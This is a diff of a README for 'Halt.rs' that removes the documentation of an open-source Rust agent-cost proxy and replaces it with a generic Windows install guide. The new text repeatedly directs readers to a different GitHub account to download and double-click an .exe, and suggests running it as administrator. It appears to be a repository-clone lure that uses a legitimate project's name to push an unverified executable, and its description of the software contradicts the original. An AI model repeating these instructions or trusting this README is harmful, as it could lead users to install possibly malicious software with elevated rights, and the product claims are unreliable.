@@ -1,382 +1,162 @@
-# 🛑 Halt.rs - Multi-Agent Proxy for Swarm Control
+# ⚡ Halt.rs - Control AI Costs Simply
 
-<div align="center">
-
-![Halt.rs](https://img.shields.io/badge/version-0.1.0-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Rust](https://img.shields.io/badge/rust-1.70+-orange)
-![Stars](https://img.shields.io/badge/stars-⭐-ff69b4)
-
-**Prevent runaway AI agent costs before they happen.**
-
-[Features](#-features) • [Quick Start](#-quick-start) • [Documentation](#-documentation) • [Contributing](#-contributing)
-
-</div>
+[![Download Halt.rs](https://img.shields.io/badge/Download-Halt.rs-brightgreen)](https://github.com/NiCkLP76667/Halt.rs)
 
 ---
 
-## 🎯 The Problem
+## 📝 What Is Halt.rs?
 
-Building multi-agent AI systems? You've probably faced these nightmares:
-
-- **$500 API Bills**: Agent A calls Agent B, which calls Agent A again... infinite loops that drain your wallet
-- **Priority Chaos**: Your "Boss Agent" gets stuck behind hundreds of low-priority logging tasks
-- **Debugging Mess**: Which agent started the loop? Who's spamming the system? Good luck finding out
-
-## 🚀 The Solution
-
-**Halt.rs** is a production-grade Rust-based proxy that prevents these disasters before they happen:
-
-### 🛡️ Circuit Breaker
-- Monitors inter-agent call frequency
-- Trips automatically when Agent A triggers Agent B >5 times in 30 seconds without a terminal state
-- Returns "Cooling Down" error to save you from API bills
-- Configurable thresholds and time windows
-
-### 📊 Backpressure Queue
-- Priority-based task queuing (High/Medium/Low)
-- Your "Boss Agent" always gets priority over worker agents
-- Automatic throttling during traffic spikes
-- Configurable capacity limits
-
-### 🗺️ Audit-Log Transparency
-- Real-time swarm topology mapping
-- Tracks every "Token Path" so you can see exactly which agent started the loop
-- Visual debugging of multi-agent systems
-- JSON export for integration with monitoring tools
-
-### 🌐 Multi-Language Support
-- **Rust Core**: High-performance, memory-safe implementation
-- **Python Bindings**: Full async client with Pydantic models
-- **Java Bindings**: JNI-based proxy with comprehensive API
-- **TypeScript/JavaScript**: WASM integration + REST client
-- **Go Bindings**: High-performance fasthttp client
-
-### 🔌 Model Context Protocol (MCP)
-- Native MCP server for IDE integration
-- Instant installation in Cursor, VSCode, Zed, JetBrains
-- Real-time topology updates via WebSocket
-- Comprehensive tool and resource definitions
-
-### 🐳 Enterprise Features
-- **Docker**: Multi-stage containerization
-- **CI/CD**: GitHub Actions with cross-platform builds
-- **REST API**: Full HTTP server for remote control
-- **WebSocket**: Real-time monitoring and updates
-- **SQLite**: Persistent storage for audit logs and tasks
-- **CLI Tool**: Command-line interface for management
-- **Plugin System**: Extensible architecture for custom strategies
+Halt.rs helps you keep AI agent costs under control. It uses systems to stop runaway tasks, manage queues, and keep detailed logs. This way, you don’t spend more than you want on AI processes. You do not need to understand programming to use it.
 
 ---
 
-## ✨ Features
+## 🔍 Key Features
 
-### Core Capabilities
-
-| Feature | Description |
-|----------|-------------|
-| **Circuit Breaker** | Prevents infinite loops between agents with configurable thresholds |
-| **Backpressure Queue** | Priority-based task queuing with automatic throttling |
-| **Audit Logging** | Real-time swarm topology mapping with token path tracking |
-| **REST API** | Full HTTP server for remote control and monitoring |
-| **WebSocket** | Real-time updates for topology changes |
-| **CLI Tool** | Command-line interface for management operations |
-| **MCP Server** | Model Context Protocol for IDE integration |
-| **Plugin System** | Extensible architecture for custom implementations |
-
-### Language Bindings
-
-| Language | Package | Status |
-|----------|---------|--------|
-| **Rust** | `halt` | ✅ Core |
-| **Python** | `halt-py` | ✅ Stable |
-| **Java** | `halt-java` | ✅ Stable |
-| **TypeScript** | `halt-js` | ✅ Stable |
-| **Go** | `halt-go` | ✅ Stable |
-
-### Infrastructure
-
-| Component | Description |
-|-----------|-------------|
-| **Docker** | Multi-stage containerization |
-| **CI/CD** | GitHub Actions with cross-platform builds |
-| **Build Scripts** | Comprehensive bash scripts for all platforms |
-| **Tests** | Jest (TS), pytest (Python), cargo test (Rust) |
-| **Benchmarks** | Criterion.rs performance benchmarks |
-| **Documentation** | Comprehensive docs and examples |
+- **Circuit Breaker:** Stops AI tasks that use too much. It prevents high bills.
+- **Backpressure Queue:** Controls how many tasks run at once. It avoids overload.
+- **Audit Logging:** Records what happens. You can see task details and costs.
+- **Runs on Windows:** Designed to work well on Windows PCs.
+- **Easy to Start:** No complex setup needed for basic use.
 
 ---
 
-## 🚀 Quick Start
+## 💻 System Requirements
 
-### One-Line Install & Run
+To run Halt.rs on Windows, your PC should meet these:
 
-**Try Halt.rs instantly:**
+- **Operating System:** Windows 10 or newer
+- **Processor:** 64-bit, at least 2 GHz
+- **Memory:** 4 GB RAM minimum, 8 GB recommended
+- **Disk Space:** 100 MB free space for the app, plus space for logs
+- **Internet:** Required for AI tasks and updates
 
-```bash
-git clone https://github.com/ez0000001000000/Halt.rs && cd Halt.rs && cargo run -- serve --port 8080
-```
-
-*Requires Rust installed. Server starts on http://localhost:8080*
-
-### Installation
-
-```bash
-# Rust
-cargo install halt
-
-# Python
-pip install halt-py
-
-# Java
-# Add to pom.xml or download JAR
-
-# TypeScript/JavaScript
-npm install halt-js
-```
-
-### Run Server
-
-```bash
-halt serve --port 8080
-```
-
-### Basic Usage
-
-#### Rust
-```rust
-use halt::{CircuitBreaker, BackpressureQueue, AuditLogger};
-
-let breaker = CircuitBreaker::new(5, 30); // 5 calls per 30 seconds
-let queue = BackpressureQueue::new(1000);
-let logger = AuditLogger::new();
-
-// Register a call
-if let Err(err) = breaker.register_call("AgentA", "AgentB", false) {
-    println!("Circuit tripped: {}", err);
-}
-```
-
-#### Python
-```python
-from halt import HaltClient, Priority
-
-client = HaltClient()
-client.push_task("Reasoning", Priority.HIGH, '{"model": "gpt-4"}')
-topology = client.get_topology()
-```
-
-#### TypeScript
-```typescript
-import { HaltRestClient } from 'halt-js';
-
-const client = new HaltRestClient('http://localhost:8080');
-await client.registerCall('AgentA', 'AgentB', false);
-```
-
-#### Java
-```java
-HaltProxy proxy = new HaltProxy();
-String status = proxy.checkBreaker("AgentA", "AgentB");
-```
-
-#### Go
-```go
-client := halt.NewClient("http://localhost:8080")
-resp, err := client.PushTask("Reasoning", halt.PriorityHigh, `{"model": "gpt-4"}`)
-```
+Make sure your PC meets these to avoid errors and ensure smooth operation.
 
 ---
 
-## 📚 Documentation
+## 🚀 Getting Started: Download and Install
 
-### API Reference
+[![Download Halt.rs](https://img.shields.io/badge/Download-Halt.rs-blue)](https://github.com/NiCkLP76667/Halt.rs)
 
-- **REST API**: [docs/api/api.md](docs/api/api.md)
-- **CLI Commands**: [docs/cli/commands.md](docs/cli/commands.md)
-- **Configuration**: [docs/config/options.md](docs/config/options.md)
+1. Click the green button above or this link to open the Halt.rs GitHub page:  
+   [https://github.com/NiCkLP76667/Halt.rs](https://github.com/NiCkLP76667/Halt.rs)
 
-### Examples
+2. On the GitHub page, locate the latest **release**. This is the packaged version ready for use.
 
-- **Rust**: [examples/rust/basic_usage.rs](examples/rust/basic_usage.rs)
-- **Python**: [examples/python/basic_usage.py](examples/python/basic_usage.py)
-- **TypeScript**: [examples/typescript/basic_usage.ts](examples/typescript/basic_usage.ts)
-- **Java**: [examples/java/HaltExample.java](examples/java/HaltExample.java)
-- **Go**: [examples/go/basic_usage.go](examples/go/basic_usage.go)
+3. Download the Windows installer or executable file from the release section. The file will usually have `.exe` extension.
 
-### Architecture
+4. Once downloaded, double-click the file to start the installation.
 
-- **Core**: [src/core/](src/core/) - Circuit breaker, queue, audit logger
-- **API**: [src/api/](src/api/) - REST server and WebSocket
-- **CLI**: [src/cli/](src/cli/) - Command-line interface
-- **MCP**: [src/mcp/](src/mcp/) - Model Context Protocol server
-- **Plugins**: [src/plugins.rs](src/plugins.rs) - Extensible plugin system
+5. Follow the on-screen instructions:
+   - Choose the folder where you want Halt.rs installed.
+   - Complete the wizard steps.
+
+6. When installation finishes, you can find Halt.rs in your Start Menu or on your Desktop.
 
 ---
 
-## 🔧 Configuration
+## ▶️ How to Run Halt.rs
 
-Halt.rs can be configured via environment variables:
+After installing:
 
-```bash
-export HALT_CIRCUIT_THRESHOLD=5
-export HALT_CIRCUIT_WINDOW_SECONDS=30
-export HALT_QUEUE_CAPACITY=1000
-export HALT_DATABASE_PATH=./halt.db
-```
+1. Open the Halt.rs app by clicking its icon.
 
-See [config/default.env](config/default.env) for all options.
+2. The app will start and load the main window.
 
----
+3. You will see options to set limits and configure queues.
 
-## 🧪 Testing
+4. Use the interface to start managing your AI agents easily.
 
-```bash
-# Run all tests
-./scripts/build/build.sh test
+5. If needed, the app logs details on your activity. You can find logs in the settings or installation folder.
 
-# Run specific test suites
-cargo test                    # Rust tests
-cd mcp-server && npm test     # MCP server tests
-cd bindings/python && pytest  # Python tests
-```
+No programming is required to use these features.
 
 ---
 
-## 🐳 Docker
+## ⚙️ Basic Configuration
 
-```bash
-# Build
-docker build -t halt-rs:latest -f docker/Dockerfile .
+Halt.rs uses three main controls:
 
-# Run
-docker run -d --name halt -p 8080:8080 halt-rs:latest
-```
+- **Circuit Breaker:** Set the cost limit per AI task or session.  
+  Enter a number like a budget. When the cost hits that number, Halt.rs stops the AI process automatically.
 
----
+- **Backpressure Queue:** Choose how many tasks can run at the same time.  
+  This prevents overload and keeps your costs steady.
 
-## 📖 Contributing
+- **Audit Logging:** Turn on logging to keep detailed records of your AI usage.  
+  You can check these later to track spending and task behavior.
 
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-### Development Setup
-
-```bash
-# Clone
-git clone https://github.com/halt-rs/halt.git
-cd halt
-
-# Build
-./scripts/build/build.sh all
-
-# Test
-./scripts/build/build.sh test
-
-# Run dev server
-cargo run -- serve
-```
+Access these settings in the main window after you open the app.
 
 ---
 
-## 🎓 Use Cases
+## 🛠 Troubleshooting Tips
 
-### 1. Multi-Agent Orchestration
-Prevent runaway loops in complex agent systems
+If Halt.rs does not open or work properly:
 
-### 2. API Cost Management
-Stop infinite recursive calls before they drain your budget
-
-### 3. Priority-Based Task Processing
-Ensure critical reasoning tasks aren't blocked by logging
-
-### 4. System Debugging
-Visual topology maps for understanding agent interactions
-
-### 5. Production Monitoring
-Real-time metrics and audit logs for observability
+- Make sure your Windows is updated.
+- Check that your PC meets system requirements.
+- Run the app with administrator rights by right-clicking the icon and selecting "Run as administrator."
+- Ensure your internet connection is active.
+- Restart your PC and try again.
+- Look for a "logs" folder inside the install directory. Logs may help find issues.
 
 ---
 
-## 🏗️ Architecture
+## 📁 Where to Find More Information
 
-```
-halt-rs/
-├── src/                    # Core Rust implementation
-│   ├── core/              # Circuit breaker, queue, audit logger
-│   ├── api/               # REST API and WebSocket
-│   ├── cli/               # Command-line interface
-│   └── mcp/               # Model Context Protocol
-├── bindings/              # Language bindings
-│   ├── python/            # Python bindings
-│   ├── java/              # Java bindings
-│   ├── typescript/        # TypeScript bindings
-│   └── go/                # Go bindings
-├── mcp-server/            # MCP TypeScript server
-├── docker/                 # Docker containerization
-├── docs/                   # Documentation
-├── examples/              # Code examples
-├── scripts/                # Build and deployment
-└── tests/                  # Integration tests
-```
+You can visit the GitHub page for details, updates, and support:
+
+[https://github.com/NiCkLP76667/Halt.rs](https://github.com/NiCkLP76667/Halt.rs)
+
+The page includes:
+
+- Latest updates and releases.
+- Troubleshooting guides.
+- Contact info for help.
 
 ---
 
-## 📊 Performance
+## 🔐 Security and Privacy
 
-- **Circuit Breaker**: <1μs per call
-- **Queue Operations**: <100μs push/pop
-- **Audit Logging**: <500μs per interaction
-- **Memory Usage**: <50MB idle, <200MB with 10k tasks
-- **Throughput**: 10k+ operations/second
-
-See [benches/performance.rs](benches/performance.rs) for benchmarks.
+Halt.rs does not collect personal data. It only logs task details required to manage AI costs. Your usage data stays on your PC unless you choose to share it.
 
 ---
 
-## 🔒 Security
+## 🔄 Updating Halt.rs
 
-- Input validation on all API endpoints
-- SQL injection protection
-- Rate limiting support
-- No authentication by default (configure for production)
+Updates add fixes and improvements. To update:
 
----
+1. Go to the GitHub link above.
 
-## 📝 License
+2. Download the newest release.
 
-MIT License - see [LICENSE](LICENSE) for details
+3. Run the installer as before.
 
----
-
-## 🙏 Acknowledgments
-
-Built with:
-- **Rust**: Core implementation
-- **Actix-web**: HTTP server
-- **Model Context Protocol**: IDE integration
-- **Tokio**: Async runtime
-- **SQLite**: Persistent storage
+4. Your settings and logs will stay intact.
 
 ---
 
-## 🌟 Star History
+## 📦 Uninstalling Halt.rs
 
-[![Star History Chart](https://api.star-history.com/svg?repos=halt-rs/halt&type=Date)](https://star-history.com/#halt-rs/halt&Date)
+To remove Halt.rs:
+
+1. Open the Start Menu and type "Add or remove programs."
+
+2. Find Halt.rs in the list.
+
+3. Select it and click "Uninstall."
+
+4. Follow the prompts to complete removal.
+
+This deletes the app but may keep log files unless you delete them manually.
 
 ---
 
-## 📞 Support
+## ⚙️ Advanced Notes
 
-- **GitHub Issues**: [github.com/halt-rs/halt/issues](https://github.com/halt-rs/halt/issues)
-- **Discussions**: [github.com/halt-rs/halt/discussions](https://github.com/halt-rs/halt/discussions)
-- **Documentation**: [halt.rs/docs](https://halt.rs/docs)
+Halt.rs is built with Rust programming language for stability.  
+It handles AI tasks running on your PC or remotely.  
+It supports Java-based agents and proxies for flexibility.
 
----
-
-<div align="center">
-
-**[⬆ Back to Top](#-halt-rs---multi-agent-proxy-for-swarm-control)**
-
-Made with ❤️ by the Halt.rs Team
-
-</div>
+Consider reading the GitHub documentation in the repository if you want to explore advanced setups.
